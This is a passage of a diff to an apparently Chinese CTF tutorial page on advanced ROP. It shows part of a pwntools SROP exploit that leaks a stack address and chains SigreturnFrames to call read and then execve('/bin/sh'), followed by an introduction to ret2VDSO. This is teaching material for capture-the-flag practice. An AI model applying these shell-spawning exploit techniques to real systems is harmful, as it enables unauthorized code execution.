 <span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;leak stack addr :&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>
 
-<span class="c1"># make the rsp point to stack_addr</span>
-<span class="c1"># the frame is read(0,stack_addr,0x400)</span>
+<span class="c1">## make the rsp point to stack_addr</span>
+<span class="c1">## the frame is read(0,stack_addr,0x400)</span>
 <span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
 <span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span>
 <span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">0</span>
@@ -1210,11 +1208,11 @@ smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
 <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="c1"># set rax=15 and call sigreturn</span>
+<span class="c1">## set rax=15 and call sigreturn</span>
 <span class="n">sigreturn</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">7</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sigreturn</span><span class="p">)</span>
 
-<span class="c1"># call execv(&quot;/bin/sh&quot;,0,0)</span>
+<span class="c1">## call execv(&quot;/bin/sh&quot;,0,0)</span>
 <span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
 <span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
 <span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">+</span> <span class="mh">0x120</span>  <span class="c1"># &quot;/bin/sh&quot; &#39;s addr</span>
@@ -1258,42 +1256,36 @@ smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
 <h2>ret2VDSO<a class="headerlink" href="#ret2vdso" title="永久链接至标题">¶</a></h2>
 <div class="section" id="vdso">
 <h3>VDSO介绍<a class="headerlink" href="#vdso" title="永久链接至标题">¶</a></h3>
-<p>什么是VDSO(Virtual Dynamically-linked Shared Object)呢？听其名字，大概是虚拟动态链接共享对象，所以说它应该是虚拟的，与虚拟内存一直，在计算机中本身并不存在。具体来说，它是将内核态的调用映射到用户地址空间的库。那么它为什么会存在呢？这是因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。通过vdso，我们可以大量减少这样的开销，同时也可以使得我们的路径更好。这里路径更好指的是，我们不需要使用传统的int
+<p>什么是VDSO(Virtual Dynamically-linked Shared
+Object)呢？听其名字，大概是虚拟动态链接共享对象，所以说它应该是虚拟的，与虚拟内存一直，在计算机中本身并不存在。具体来说，它是将内核态的调用映射到用户地址空间的库。那么它为什么会存在呢？这是因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。通过vdso，我们可以大量减少这样的开销，同时也可以使得我们的路径更好。这里路径更好指的是，我们不需要使用传统的int
 0x80来进行系统调用，不同的处理器实现了不同的快速系统调用指令</p>
 <ul class="simple">
 <li>intel实现了sysenter，sysexit</li>
 <li>amd实现了syscall，sysret</li>
 </ul>
 <p>当不同的处理器架构实现了不同的指令时，自然就会出现兼容性问题，所以linux实现了vsyscall接口，在底层会根据具体的结构来进行具体操作。而vsyscall就实现在vdso中。</p>
-<p>这里，我们顺便来看一下vdso，在Linux(kernel 2.6 or upper)中执行ldd
-/bin/sh,
-会发现有个名字叫linux-vdso.so.1(老点的版本是linux-gate.so.1)的动态文件,
-而系统中却找不到它, 它就是VDSO。 例如:</p>
+<p>这里，我们顺便来看一下vdso，在Linux(kernel 2.6 or upper)中执行ldd /bin/sh, 会发现有个名字叫linux-vdso.so.1(老点的版本是linux-gate.so.1)的动态文件, 而系统中却找不到它, 它就是VDSO。 例如:</p>
 <div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ~ ldd /bin/sh
     linux-vdso.so.1 =&gt;  (0x00007ffd8ebf2000)
     libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f84ff2f9000)
     /lib64/ld-linux-x86-64.so.2 (0x0000560cae6eb000)
 </pre></div>
 </div>
-<p>除了快速系统调用，glibc也提供了VDSO的支持, open(), read(), write(),
-gettimeofday()都可以直接使用VDSO中的实现。使得这些调用速度更快。
-内核新特性在不影响glibc的情况下也可以更快的部署。</p>
+<p>除了快速系统调用，glibc也提供了VDSO的支持, open(), read(), write(), gettimeofday()都可以直接使用VDSO中的实现。使得这些调用速度更快。 内核新特性在不影响glibc的情况下也可以更快的部署。</p>
 <p>这里我们以intel的处理器为例，进行简单说明。</p>
-<p>其中sysenter的参数传递方式与int 0x80一致，但是我们可能需要自己布置好
-function prolog（32位为例）</p>
-<div class="code Asm highlight-default"><div class="highlight"><pre><span></span><span class="n">push</span> <span class="n">ebp</span>
+<p>其中sysenter的参数传递方式与int 0x80一致，但是我们可能需要自己布置好 function prolog（32位为例）</p>
+<div class="code asm highlight-default"><div class="highlight"><pre><span></span><span class="n">push</span> <span class="n">ebp</span>
 <span class="n">mov</span> <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
 </pre></div>
 </div>
-<p>此外，如果我们没有提供functtion
-prolog的话，我们还需要一个可以进行栈迁移的gadgets，以便于可以改变栈的位置。</p>
+<p>此外，如果我们没有提供functtion prolog的话，我们还需要一个可以进行栈迁移的gadgets，以便于可以改变栈的位置。</p>
 </div>
-<div class="section" id="id14">
-<h3>原理<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id13">
+<h3>原理<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h3>
 <p>待补充。</p>
 </div>
-<div class="section" id="id15">
-<h3>题目<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id14">
+<h3>题目<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h3>
 <ul class="simple">
 <li><strong>Defcon 2015 Qualifier fuckup</strong></li>
 </ul>
